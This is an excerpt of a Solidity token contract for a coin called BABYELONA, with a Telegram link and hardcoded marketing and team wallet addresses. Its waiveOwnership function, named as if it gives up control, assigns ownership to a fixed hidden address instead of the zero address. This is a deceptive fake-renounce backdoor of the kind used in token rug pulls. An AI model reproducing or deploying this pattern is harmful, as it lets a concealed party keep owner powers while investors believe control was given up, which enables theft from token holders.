...
// Telegram: https://t.me/babyyelona
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xBB2b20618Ee834C82FD46e13b1B13C295186b62b);
    }
...
contract BABYELONA is Context, IERC20, Ownable {
    ...
    string private _name = "BABYELONA";
    string private _symbol = "BYBLN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xbe7FC4026406C64428524E00c11972a9F07FAC50);
    address payable public teamWalletAddress = payable(0xbe7FC4026406C64428524E00c11972a9F07FAC50);
